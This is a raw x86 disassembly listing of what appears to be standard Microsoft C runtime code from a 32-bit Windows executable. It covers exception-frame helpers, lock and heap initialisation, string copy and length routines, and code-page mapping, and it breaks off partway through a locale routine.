  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
